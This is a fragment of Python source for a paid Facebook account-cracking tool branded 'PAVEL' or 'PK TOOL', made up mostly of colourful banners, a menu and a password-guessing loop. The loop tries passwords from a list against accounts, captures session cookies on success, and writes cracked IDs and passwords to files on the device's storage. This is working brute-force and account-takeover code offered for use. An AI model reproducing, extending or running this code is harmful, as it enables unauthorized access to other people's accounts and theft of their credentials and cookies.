...
logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mPAVEL\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mPavel\x1b[0;m\x1b[1;32m && \x1b[1;33mPavel\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m PK\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-PK\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS Paid\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mPK\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m0.2.3\n\x1b[1;37m================= \x1b[32;45mPavel\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO PK TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mBD\x1b[0;m ======================\n'

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] Promisin Kye')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/P.K.LOVE.YOU.0')
        FD()
        return None
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] Flow My Facebook Account ')
    print(' [2] EXIT')
...
logo =                                          ("""   
 ...
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |   ______     | || |      __      | || | ____   ____  | || |  _________   | || |   _____      | |
| |  |_   __ \   | || |     /  \     | || ||_  _| |_  _| | || | |_   ___  |  | || |  |_   _|     | |
| |    | |__) |  | || |    / /\ \    | || |  \ \   / /   | || |   | |_  \_|  | || |    | |       | |
| |    |  ___/   | || |   / ____ \   | || |   \ \ / /    | || |   |  _|  _   | || |    | |   _   | |
| |   _| |_      | || | _/ /    \ \_ | || |    \ ' /     | || |  _| |___/ |  | || |   _| |__/ |  | |
| |  |_____|     | || ||____|  |____|| || |     \_/      | || | |_________|  | || |  |________|  | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------''
                                                                                                        
 
\033[1;37m================= \33[32;45mPAVEL\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mPAVEL\33[0;m\033[1;32m && \033[1;33mPAVEL\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m PK
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-PAVEL
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS Paid
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mPAVEL
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mPAVEL\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO PAVEL TOOL\33[0;m
 
\033[1;37m================== \33[32;45mPK\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(PAVEL-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/PAVEL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(PAVEL-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/PAVEL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[PAVEL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
